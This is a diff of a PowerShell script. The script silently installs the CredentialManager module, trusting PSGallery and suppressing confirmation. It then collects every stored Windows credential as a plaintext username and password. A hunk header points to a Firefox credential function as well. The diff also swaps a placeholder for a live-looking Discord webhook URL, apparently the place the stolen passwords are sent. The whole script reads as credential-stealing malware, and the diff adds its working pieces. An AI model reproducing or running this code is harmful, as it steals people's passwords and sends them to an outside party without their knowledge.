@@ -1,12 +1,20 @@
+
 try {
     Import-Module -Name CredentialManager
-}catch {
-    Write-Host "Missing Module..."
+    $crdMgr = $true
+} catch {
+    Write-Host "Missing CredentialManager module..." -ForegroundColor "yellow"
+    try {
+        set-psRepository -name PSGallery -installationPolicy trusted
+        Install-Module -Name CredentialManager -Scope CurrentUser -Confirm:$false -Repository PSGallery
+    } catch {
+        # Impossible to load CredentialManager Module :(
+        $crdMgr = $false
+    }
 }
 
 
-$webHookUrl = "WEBHOOK HERE"
-
+$webHookUrl = "https://discord.com/api/webhooks/873647888645898241/VCtL2QCQmdXnKceEYRQrApF9HNKmn8JLTCYjlYYu33pI5bfKRjb95Y0Cp20B85qatyc6"
 
 function IsInstalled($appName){
     $AppToCheck = '`'+$appName+'*'
@@ -59,13 +67,14 @@ function Get-FireFoxCred {
 
 
 # Get Windows Credentials
-$WCred = @()
-foreach ($i in Get-StoredCredential){
-    $username = $i.UserName
-    $Password = $i.GetNetworkCredential().password
-    $WCred += New-Object -TypeName psobject -Property @{Username=$username; Password=$Password}
+if ($crdMgr) {
+    $WCred = @()
+    foreach ($i in Get-StoredCredential){
+        $username = $i.UserName
+        $Password = $i.GetNetworkCredential().password
+        $WCred += New-Object -TypeName psobject -Property @{Username=$username; Password=$Password}
+    }
 }
-
 
 
 
